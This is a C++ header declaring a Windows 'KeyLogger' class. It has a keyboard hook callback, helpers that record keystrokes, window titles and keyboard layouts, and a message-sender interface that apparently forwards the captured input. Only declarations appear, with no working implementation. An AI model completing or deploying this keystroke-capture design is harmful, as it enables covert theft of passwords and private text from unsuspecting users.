#pragma once

#include <functional>
#include <map>
#include <mutex>
#include <Windows.h>

#include "IMessageSender.h"

class KeyLogger
{
public:
	KeyLogger(IMessageSender* sender);
	~KeyLogger();

private:
	static LRESULT CALLBACK HookCallback(int nCode, WPARAM wParam, LPARAM lParam);

	static std::string GetLog(int keyStroke);
	static std::string GetWindowTitle(HWND windowHandle);
	static HKL GetKeyboardLayout(HWND windowHandle);
	static std::string GetWindowPrefix(HWND windowHandle);

	void LogKeyboardEvent(const std::string& log) const;

	static std::mutex _mutex;
	static std::vector<KeyLogger*> _instances;
	static std::unique_ptr<HHOOK> _hook;
	static std::map<int, std::string> _keyNames;
	static std::string _lastWindowTitle;

	IMessageSender* _sender;
};

